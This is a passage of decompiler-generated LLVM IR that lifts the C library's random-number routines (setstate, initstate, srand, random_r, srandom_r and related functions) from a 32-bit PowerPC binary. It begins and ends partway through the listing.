  %v3_1000e9f8 = call i32 @__GI_random_r(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -6984) to i32*), i32 %v2_1000e9f0)
  store i32 %v2_1000e9c8, i32* @r3, align 4
  %v0_1000ea04 = call i32 @__pthread_return_void()
  %v3_1000ea0c = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_1000ea0c
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002e4a0.887 to i32), i32* %r29.global-to-local, align 4
  %v2_1000ea44 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000ea44, i32* @r3, align 4
  %v0_1000ea4c = call i32 @__pthread_return_void()
  %v0_1000ea54 = call i32 @__pthread_return_0()
  store i32 268495472, i32* @lr, align 4
  %v3_1000ea6c = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_1002e4b8)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_1000ea74 = icmp slt i32 %v3_1000ea6c, 0
  store i32 %v2_1000ea44, i32* @r3, align 4
  br i1 %v1_1000ea74, label %dec_label_pc_1000ea88, label %dec_label_pc_1000ea84

dec_label_pc_1000ea84:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1002e4bc.891 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000ea88

dec_label_pc_1000ea88:                            ; preds = %entry, %dec_label_pc_1000ea84
  %v0_1000ea88 = call i32 @__pthread_return_void()
  %v0_1000ea90 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1000ea90

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000ea88, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_1000eab4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000eab4, i32* @r3, align 4
  %v0_1000eadc = call i32 @__pthread_return_void()
  %v0_1000eae4 = call i32 @__pthread_return_0()
  store i32 %arg1, i32* @r3, align 4
  store i32 268495620, i32* @lr, align 4
  %v4_1000eb00 = inttoptr i32 %arg1 to i32*
  %v5_1000eb00 = call i32 @__GI_initstate_r(i32* %v4_1000eb00, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_1002e4b8 to i32))
  store i32 %v2_1000eab4, i32* @r3, align 4
  %v0_1000eb0c = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_1002e4bc.891 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000eb40 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000eb40, i32* @r3, align 4
  %v0_1000eb5c = call i32 @__pthread_return_void()
  %v0_1000eb64 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_1002e4b8 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268495736, i32* @lr, align 4
  %v0_1000eb74 = call i32 @srandom_r()
  store i32 %v2_1000eb40, i32* @r3, align 4
  %v0_1000eb80 = call i32 @__pthread_return_void()
  ret i32 %v0_1000eb80

; uselistorder directives
  uselistorder i32* @global_var_1002e4b8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002e4b8 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1000eb98 = add i32 %tmp, 12
  %v2_1000eb98 = inttoptr i32 %v1_1000eb98 to i32*
  %v3_1000eb98 = load i32, i32* %v2_1000eb98, align 4
  store i32 %v3_1000eb98, i32* %r11.global-to-local, align 4
  %v0_1000eb9c = load i32, i32* @lr, align 4
  store i32 %v0_1000eb9c, i32* %r0.global-to-local, align 4
  %v1_1000eba4 = add i32 %arg1, 4
  store i32 %v1_1000eba4, i32* %r3.global-to-local, align 4
  %v3_1000eba8 = icmp eq i32 %v3_1000eb98, 0
  %v1_1000ebac = add i32 %tmp, 8
  %v2_1000ebac = inttoptr i32 %v1_1000ebac to i32*
  %v3_1000ebac = load i32, i32* %v2_1000ebac, align 4
  store i32 %v3_1000ebac, i32* %r9.global-to-local, align 4
  br i1 %v3_1000eba8, label %dec_label_pc_1000ebb8, label %dec_label_pc_1000ebc0

dec_label_pc_1000ebb8:                            ; preds = %entry
  %v2_1000ebb8 = add i32 %v3_1000ebac, -4
  %v3_1000ebb8 = inttoptr i32 %v2_1000ebb8 to i32*
  store i32 0, i32* %v3_1000ebb8, align 4
  br label %dec_label_pc_1000ebd8

dec_label_pc_1000ebc0:                            ; preds = %entry
  %v1_1000ebc0 = add i32 %tmp, 4
  %v2_1000ebc0 = inttoptr i32 %v1_1000ebc0 to i32*
  %v3_1000ebc0 = load i32, i32* %v2_1000ebc0, align 4
  %v2_1000ebc4 = sub i32 %v3_1000ebc0, %v3_1000ebac
  %v4_1000ebc8 = sdiv i32 %v2_1000ebc4, 4
  %v1_1000ebcc = mul i32 %v4_1000ebc8, 5
  %v2_1000ebd0 = add i32 %v1_1000ebcc, %v3_1000eb98
  store i32 %v2_1000ebd0, i32* %r0.global-to-local, align 4
  %v2_1000ebd4 = add i32 %v3_1000ebac, -4
  %v3_1000ebd4 = inttoptr i32 %v2_1000ebd4 to i32*
  store i32 %v2_1000ebd0, i32* %v3_1000ebd4, align 4
  br label %dec_label_pc_1000ebd8

dec_label_pc_1000ebd8:                            ; preds = %dec_label_pc_1000ebb8, %dec_label_pc_1000ebc0
  %v0_1000ebd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000ebd8 = add i32 %v0_1000ebd8, -4
  %v2_1000ebd8 = inttoptr i32 %v1_1000ebd8 to i32*
  %v3_1000ebd8 = load i32, i32* %v2_1000ebd8, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001d494.892 to i32), i32* %r9.global-to-local, align 4
  %v2_1000ebe8 = srem i32 %v3_1000ebd8, 5
  store i32 %v2_1000ebe8, i32* %r11.global-to-local, align 4
  %v2_1000ebf8 = icmp ugt i32 %v2_1000ebe8, 4
  %v1_1000ebfc = mul nsw i32 %v2_1000ebe8, 4
  store i32 %v1_1000ebfc, i32* %r0.global-to-local, align 4
  %v2_1000ec04 = add i32 %v1_1000ebfc, ptrtoint (i32* @global_var_1001d494.892 to i32)
  store i32 %v2_1000ec04, i32* %r10.global-to-local, align 4
  br i1 %v2_1000ebf8, label %dec_label_pc_1000ec68, label %dec_label_pc_1000ec0c

dec_label_pc_1000ec0c:                            ; preds = %dec_label_pc_1000ebd8
  %v3_1000ec00 = icmp eq i32 %v2_1000ebe8, 0
  %v1_1000ec0c = add i32 %v1_1000ebfc, add (i32 ptrtoint (i32* @global_var_1001d494.892 to i32), i32 20)
  %v2_1000ec0c = inttoptr i32 %v1_1000ec0c to i32*
  %v3_1000ec0c = load i32, i32* %v2_1000ec0c, align 4
  store i32 %v3_1000ec0c, i32* %r10.global-to-local, align 4
  %v3_1000ec10 = inttoptr i32 %v2_1000ec04 to i32*
  %v4_1000ec10 = load i32, i32* %v3_1000ec10, align 4
  store i32 %v4_1000ec10, i32* %r9.global-to-local, align 4
  %v1_1000ec14 = mul i32 %v3_1000ec0c, 4
  store i32 %v1_1000ec14, i32* %r0.global-to-local, align 4
  %v2_1000ec18 = add i32 %tmp, 16
  %v3_1000ec18 = inttoptr i32 %v2_1000ec18 to i32*
  store i32 %v3_1000ec0c, i32* %v3_1000ec18, align 4
  %v0_1000ec1c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000ec1c = add i32 %tmp, 20
  %v3_1000ec1c = inttoptr i32 %v2_1000ec1c to i32*
  store i32 %v0_1000ec1c, i32* %v3_1000ec1c, align 4
  %v0_1000ec20 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000ec20 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000ec20 = add i32 %v1_1000ec20, %v0_1000ec20
  store i32 %v2_1000ec20, i32* %r8.global-to-local, align 4
  %v0_1000ec24 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000ec24, i32* %v2_1000eb98, align 4
  br i1 %v3_1000ec00, label %dec_label_pc_1000ec5c, label %dec_label_pc_1000ec2c

dec_label_pc_1000ec2c:                            ; preds = %dec_label_pc_1000ec0c
  %v0_1000ec2c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000ec2c = add i32 %v0_1000ec2c, -4
  %v2_1000ec2c = inttoptr i32 %v1_1000ec2c to i32*
  %v3_1000ec2c = load i32, i32* %v2_1000ec2c, align 4
  %v1_1000ec30 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000ec30 = sdiv i32 %v3_1000ec2c, %v1_1000ec30
  %v1_1000ec34 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000ec34 = add i32 %v1_1000ec34, %v2_1000ec30
  store i32 %v2_1000ec34, i32* %r9.global-to-local, align 4
  %v1_1000ec38 = mul i32 %v2_1000ec30, 4
  %v1_1000ec3c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000ec3c = sdiv i32 %v2_1000ec34, %v1_1000ec3c
  store i32 %v2_1000ec3c, i32* %r11.global-to-local, align 4
  %v2_1000ec40 = add i32 %v1_1000ec38, %v0_1000ec2c
  store i32 %v2_1000ec40, i32* %r0.global-to-local, align 4
  %v2_1000ec44 = add i32 %tmp, 4
  %v3_1000ec44 = inttoptr i32 %v2_1000ec44 to i32*
  store i32 %v2_1000ec40, i32* %v3_1000ec44, align 4
  %v0_1000ec48 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ec48 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000ec48 = mul i32 %v1_1000ec48, %v0_1000ec48
  store i32 %v2_1000ec48, i32* %r11.global-to-local, align 4
  %v1_1000ec4c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000ec4c = sub i32 %v1_1000ec4c, %v2_1000ec48
  %v1_1000ec50 = mul i32 %v2_1000ec4c, 4
  %v0_1000ec54 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000ec54 = add i32 %v1_1000ec50, %v0_1000ec54
  store i32 %v2_1000ec54, i32* %r9.global-to-local, align 4
  store i32 %v2_1000ec54, i32* %arg2, align 4
  br label %dec_label_pc_1000ec5c

dec_label_pc_1000ec5c:                            ; preds = %dec_label_pc_1000ec0c, %dec_label_pc_1000ec2c
  %v0_1000ec5c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ec5c = add i32 %tmp, 24
  %v3_1000ec5c = inttoptr i32 %v2_1000ec5c to i32*
  store i32 %v0_1000ec5c, i32* %v3_1000ec5c, align 4
  %v0_1000ec60 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1000ec60, i32* %v2_1000ebac, align 4
  %v0_1000ec7c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000ec78

dec_label_pc_1000ec68:                            ; preds = %dec_label_pc_1000ebd8
  %v0_1000ec68 = call i32 @__errno_location()
  store i32 %v0_1000ec68, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000ec70 = inttoptr i32 %v0_1000ec68 to i32*
  store i32 22, i32* %v2_1000ec70, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000ec78

dec_label_pc_1000ec78:                            ; preds = %dec_label_pc_1000ec5c, %dec_label_pc_1000ec68
  %v0_1000ec7c = phi i32 [ %v0_1000ec7c.pre, %dec_label_pc_1000ec5c ], [ -1, %dec_label_pc_1000ec68 ]
  store i32 %v0_1000eb9c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ec7c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ec7c

; uselistorder directives
  uselistorder i32 %v0_1000ec7c, { 1, 0 }
  uselistorder i32 %v3_1000ec0c, { 1, 0, 2 }
  uselistorder i32 %v1_1000ebfc, { 2, 1, 0 }
  uselistorder i32 %v2_1000ebe8, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_1000ec78, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ebd8, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1000ec8c = add i32 %tmp, 12
  %v2_1000ec8c = inttoptr i32 %v1_1000ec8c to i32*
  %v3_1000ec8c = load i32, i32* %v2_1000ec8c, align 4
  %v1_1000ec98 = add i32 %tmp, 8
  %v2_1000ec98 = inttoptr i32 %v1_1000ec98 to i32*
  %v3_1000ec98 = load i32, i32* %v2_1000ec98, align 4
  store i32 %v3_1000ec98, i32* %r7.global-to-local, align 4
  %v3_1000ec9c = icmp eq i32 %v3_1000ec8c, 0
  br i1 %v3_1000ec9c, label %dec_label_pc_1000eca4, label %dec_label_pc_1000ecc0

dec_label_pc_1000eca4:                            ; preds = %entry
  %v1_1000eca4 = inttoptr i32 %v3_1000ec98 to i32*
  %v2_1000eca4 = load i32, i32* %v1_1000eca4, align 4
  %v2_1000eca8 = mul i32 %v2_1000eca4, 1103515245
  %v1_1000ecac = add i32 %v2_1000eca8, 12345
  %v1_1000ecb0 = urem i32 %v1_1000ecac, -2147483648
  store i32 %v1_1000ecb0, i32* %r9.global-to-local, align 4
  store i32 %v1_1000ecb0, i32* %v1_1000eca4, align 4
  %v0_1000ecb8 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000ecb8 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000ecb8, i32* %v2_1000ecb8, align 4
  br label %dec_label_pc_1000ed14

dec_label_pc_1000ecc0:                            ; preds = %entry
  %v2_1000ecc0 = load i32, i32* %arg1, align 4
  %v1_1000ecc4 = add i32 %tmp, 4
  %v2_1000ecc4 = inttoptr i32 %v1_1000ecc4 to i32*
  %v3_1000ecc4 = load i32, i32* %v2_1000ecc4, align 4
  store i32 %v3_1000ecc4, i32* %r9.global-to-local, align 4
  %v1_1000ecc8 = add i32 %tmp, 24
  %v2_1000ecc8 = inttoptr i32 %v1_1000ecc8 to i32*
  %v3_1000ecc8 = load i32, i32* %v2_1000ecc8, align 4
  %v1_1000eccc = add i32 %v2_1000ecc0, 4
  store i32 %v1_1000eccc, i32* @r8, align 4
  %v1_1000ecd0 = add i32 %v3_1000ecc4, 4
  %v1_1000ecd4 = inttoptr i32 %v3_1000ecc4 to i32*
  %v2_1000ecd4 = load i32, i32* %v1_1000ecd4, align 4
  store i32 %v2_1000ecd4, i32* %r9.global-to-local, align 4
  %v2_1000ecd8 = icmp ult i32 %v1_1000eccc, %v3_1000ecc8
  %v1_1000ece0 = inttoptr i32 %v2_1000ecc0 to i32*
  %v2_1000ece0 = load i32, i32* %v1_1000ece0, align 4
  store i32 %v1_1000ecd0, i32* %r10.global-to-local, align 4
  %v2_1000ece8 = add i32 %v2_1000ece0, %v2_1000ecd4
  %v1_1000ecec = udiv i32 %v2_1000ece8, 2
  store i32 %v1_1000ecec, i32* %r9.global-to-local, align 4
  store i32 %v2_1000ece8, i32* %v1_1000ece0, align 4
  %v0_1000ecf4 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000ecf4 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000ecf4, i32* %v2_1000ecf4, align 4
  br i1 %v2_1000ecd8, label %dec_label_pc_1000ed04, label %dec_label_pc_1000ecfc

dec_label_pc_1000ecfc:                            ; preds = %dec_label_pc_1000ecc0
  %v0_1000ecfc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000ecfc, i32* @r8, align 4
  br label %dec_label_pc_1000ed0c

dec_label_pc_1000ed04:                            ; preds = %dec_label_pc_1000ecc0
  %v2_1000ecdc = icmp ult i32 %v1_1000ecd0, %v3_1000ecc8
  br i1 %v2_1000ecdc, label %dec_label_pc_1000ed0c, label %dec_label_pc_1000ed08

dec_label_pc_1000ed08:                            ; preds = %dec_label_pc_1000ed04
  %v0_1000ed08 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000ed08, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000ed0c

dec_label_pc_1000ed0c:                            ; preds = %dec_label_pc_1000ed04, %dec_label_pc_1000ecfc, %dec_label_pc_1000ed08
  %v0_1000ed0c = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000ed0c, i32* %v2_1000ecc4, align 4
  %v0_1000ed10 = load i32, i32* @r8, align 4
  store i32 %v0_1000ed10, i32* %arg1, align 4
  br label %dec_label_pc_1000ed14

dec_label_pc_1000ed14:                            ; preds = %dec_label_pc_1000eca4, %dec_label_pc_1000ed0c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000ece8, { 1, 0 }
  uselistorder i32 %v1_1000ecd0, { 1, 0 }
  uselistorder i32 %v3_1000ecc4, { 1, 0, 2 }
  uselistorder i32 %v1_1000ecb0, { 1, 0 }
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed14, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed0c, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000ed1c = load i32, i32* @lr, align 4
  %v0_1000ed28 = load i32, i32* @r4, align 4
  store i32 %v0_1000ed28, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1000ed34 = add i32 %v0_1000ed28, 12
  %v2_1000ed34 = inttoptr i32 %v1_1000ed34 to i32*
  %v3_1000ed34 = load i32, i32* %v2_1000ed34, align 4
  %v2_1000ed38 = icmp ugt i32 %v3_1000ed34, 4
  br i1 %v2_1000ed38, label %dec_label_pc_1000ede8, label %dec_label_pc_1000ed40

dec_label_pc_1000ed40:                            ; preds = %entry
  %v0_1000ed40 = load i32, i32* @r3, align 4
  %v3_1000ed40 = icmp eq i32 %v0_1000ed40, 0
  %v1_1000ed44 = add i32 %v0_1000ed28, 8
  %v2_1000ed44 = inttoptr i32 %v1_1000ed44 to i32*
  %v3_1000ed44 = load i32, i32* %v2_1000ed44, align 4
  store i32 %v3_1000ed44, i32* %r10.global-to-local, align 4
  br i1 %v3_1000ed40, label %dec_label_pc_1000ed4c, label %dec_label_pc_1000ed50

dec_label_pc_1000ed4c:                            ; preds = %dec_label_pc_1000ed40
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_1000ed50

dec_label_pc_1000ed50:                            ; preds = %dec_label_pc_1000ed40, %dec_label_pc_1000ed4c
  %v0_1000ed54 = phi i32 [ %v0_1000ed40, %dec_label_pc_1000ed40 ], [ 1, %dec_label_pc_1000ed4c ]
  %v3_1000ed50 = icmp eq i32 %v3_1000ed34, 0
  %v2_1000ed54 = inttoptr i32 %v3_1000ed44 to i32*
  store i32 %v0_1000ed54, i32* %v2_1000ed54, align 4
  br i1 %v3_1000ed50, label %dec_label_pc_1000ede4, label %dec_label_pc_1000ed5c

dec_label_pc_1000ed5c:                            ; preds = %dec_label_pc_1000ed50
  %v0_1000ed5c = load i32, i32* @r30, align 4
  %v1_1000ed5c = add i32 %v0_1000ed5c, 16
  %v2_1000ed5c = inttoptr i32 %v1_1000ed5c to i32*
  %v3_1000ed5c = load i32, i32* %v2_1000ed5c, align 4
  store i32 %v3_1000ed5c, i32* %r11.global-to-local, align 4
  store i32 127773, i32* @r8, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_1000ed74 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_1000ed5c, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_1000ed5c, 0
  br i1 %tmp18, label %dec_label_pc_1000edb0.preheader, label %dec_label_pc_1000edb0.preheader.thread

dec_label_pc_1000edb0.preheader.thread:           ; preds = %dec_label_pc_1000ed5c
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000edb4

dec_label_pc_1000edb0.preheader:                  ; preds = %dec_label_pc_1000ed5c
  %v1_1000edb02 = add i32 %v3_1000ed5c, -1
  store i32 %v1_1000edb02, i32* %ctr.global-to-local, align 4
  %v2_1000edb03 = icmp eq i32 %v1_1000edb02, 0
  br i1 %v2_1000edb03, label %dec_label_pc_1000edb4, label %dec_label_pc_1000ed8c

dec_label_pc_1000ed8c:                            ; preds = %dec_label_pc_1000edb0.preheader, %dec_label_pc_1000edac.dec_label_pc_1000ed8c_crit_edge
  %v1_1000edac = phi i32 [ %v2_1000edac, %dec_label_pc_1000edac.dec_label_pc_1000ed8c_crit_edge ], [ %v0_1000ed74, %dec_label_pc_1000edb0.preheader ]
  %v1_1000ed8c = phi i32 [ %v1_1000ed8c.pre, %dec_label_pc_1000edac.dec_label_pc_1000ed8c_crit_edge ], [ 127773, %dec_label_pc_1000edb0.preheader ]
  %v0_1000ed8c = load i32, i32* @r3, align 4
  %v2_1000ed8c = sdiv i32 %v0_1000ed8c, %v1_1000ed8c
  %v2_1000ed90 = mul i32 %v2_1000ed8c, %v1_1000ed8c
  %v2_1000ed94 = sub i32 %v0_1000ed8c, %v2_1000ed90
  %v1_1000ed98 = mul i32 %v2_1000ed8c, 2836
  store i32 %v1_1000ed98, i32* %r0.global-to-local, align 4
  %v1_1000ed9c = mul i32 %v2_1000ed94, 16807
  %v2_1000eda0 = sub i32 %v1_1000ed9c, %v1_1000ed98
  store i32 %v2_1000eda0, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_1000eda0, -1
  br i1 %tmp19, label %dec_label_pc_1000edac, label %dec_label_pc_1000eda8

dec_label_pc_1000eda8:                            ; preds = %dec_label_pc_1000ed8c
  %v1_1000eda8 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000eda8 = add i32 %v1_1000eda8, %v2_1000eda0
  store i32 %v2_1000eda8, i32* @r3, align 4
  br label %dec_label_pc_1000edac

dec_label_pc_1000edac:                            ; preds = %dec_label_pc_1000ed8c, %dec_label_pc_1000eda8
  %v0_1000edac = phi i32 [ %v2_1000eda0, %dec_label_pc_1000ed8c ], [ %v2_1000eda8, %dec_label_pc_1000eda8 ]
  %v2_1000edac = add i32 %v1_1000edac, 4
  %v3_1000edac = inttoptr i32 %v2_1000edac to i32*
  store i32 %v0_1000edac, i32* %v3_1000edac, align 4
  %v0_1000edb0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000edb0 = add i32 %v0_1000edb0, -1
  store i32 %v1_1000edb0, i32* %ctr.global-to-local, align 4
  %v2_1000edb0 = icmp eq i32 %v1_1000edb0, 0
  br i1 %v2_1000edb0, label %dec_label_pc_1000edb0.dec_label_pc_1000edb4_crit_edge, label %dec_label_pc_1000edac.dec_label_pc_1000ed8c_crit_edge

dec_label_pc_1000edac.dec_label_pc_1000ed8c_crit_edge: ; preds = %dec_label_pc_1000edac
  %v1_1000ed8c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000ed8c

dec_label_pc_1000edb0.dec_label_pc_1000edb4_crit_edge: ; preds = %dec_label_pc_1000edac
  %v0_1000edb4.pre = load i32, i32* @r30, align 4
  %v0_1000edb8.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000edbc.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000edb4

dec_label_pc_1000edb4:                            ; preds = %dec_label_pc_1000edb0.preheader.thread, %dec_label_pc_1000edb0.dec_label_pc_1000edb4_crit_edge, %dec_label_pc_1000edb0.preheader
  %v0_1000edbc = phi i32 [ %v0_1000edbc.pre, %dec_label_pc_1000edb0.dec_label_pc_1000edb4_crit_edge ], [ %v0_1000ed74, %dec_label_pc_1000edb0.preheader ], [ %v0_1000ed74, %dec_label_pc_1000edb0.preheader.thread ]
  %v0_1000edb8 = phi i32 [ %v0_1000edb8.pre, %dec_label_pc_1000edb0.dec_label_pc_1000edb4_crit_edge ], [ %v3_1000ed5c, %dec_label_pc_1000edb0.preheader ], [ %v3_1000ed5c, %dec_label_pc_1000edb0.preheader.thread ]
  %v1_1000edbc = phi i32 [ %v0_1000edb4.pre, %dec_label_pc_1000edb0.dec_label_pc_1000edb4_crit_edge ], [ %v0_1000ed5c, %dec_label_pc_1000edb0.preheader ], [ %v0_1000ed5c, %dec_label_pc_1000edb0.preheader.thread ]
  %v1_1000edb4 = add i32 %v1_1000edbc, 20
  %v2_1000edb4 = inttoptr i32 %v1_1000edb4 to i32*
  %v3_1000edb4 = load i32, i32* %v2_1000edb4, align 4
  store i32 %v3_1000edb4, i32* %r0.global-to-local, align 4
  %v1_1000edb8 = mul i32 %v0_1000edb8, 10
  store i32 %v1_1000edb8, i32* %r31.global-to-local, align 4
  %v2_1000edbc = add i32 %v1_1000edbc, 4
  %v3_1000edbc = inttoptr i32 %v2_1000edbc to i32*
  store i32 %v0_1000edbc, i32* %v3_1000edbc, align 4
  %v0_1000edc0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000edc0 = mul i32 %v0_1000edc0, 4
  %v0_1000edc4 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000edc4 = add i32 %v0_1000edc4, %v1_1000edc0
  store i32 %v2_1000edc4, i32* %r0.global-to-local, align 4
  %v1_1000edc8 = load i32, i32* @r30, align 4
  %v2_1000edc8 = inttoptr i32 %v1_1000edc8 to i32*
  store i32 %v2_1000edc4, i32* %v2_1000edc8, align 4
  %v2_1000eddc = ptrtoint i32* %stack_var_-24 to i32
  %v0_1000edd421 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000edd422 = add i32 %v0_1000edd421, -1
  store i32 %v1_1000edd422, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_1000edd422, -1
  br i1 %tmp2025, label %dec_label_pc_1000edd0, label %dec_label_pc_1000ede4

dec_label_pc_1000edd0:                            ; preds = %dec_label_pc_1000edb4, %dec_label_pc_1000edd0
  %v0_1000edd826 = load i32, i32* @r30, align 4
  %v2_1000edd0 = inttoptr i32 %v0_1000edd826 to i32*
  %v3_1000edd0 = call i32 @__GI_random_r(i32* %v2_1000edd0, i32 %v2_1000eddc)
  %v0_1000edd4 = load i32, i32* @r31, align 4
  %v1_1000edd4 = add i32 %v0_1000edd4, -1
  store i32 %v1_1000edd4, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_1000edd4, -1
  br i1 %tmp20, label %dec_label_pc_1000edd0, label %dec_label_pc_1000ede4

dec_label_pc_1000ede4:                            ; preds = %dec_label_pc_1000edb4, %dec_label_pc_1000edd0, %dec_label_pc_1000ed50
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000ede8

dec_label_pc_1000ede8:                            ; preds = %entry, %dec_label_pc_1000ede4
  %v0_1000ede8 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_1000ede4 ]
  store i32 %v0_1000ed1c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000ede8

; uselistorder directives
  uselistorder i32 %v1_1000edb0, { 1, 0 }
  uselistorder i32 %v2_1000edac, { 1, 0 }
  uselistorder i32 %v2_1000eda0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000ed8c, { 1, 0 }
  uselistorder i32 %v0_1000ed74, { 1, 2, 0 }
  uselistorder i32 %v3_1000ed5c, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_1000ede8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ede4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000edd0, { 1, 0 }
  uselistorder label %dec_label_pc_1000edb4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000edac, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed8c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed50, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
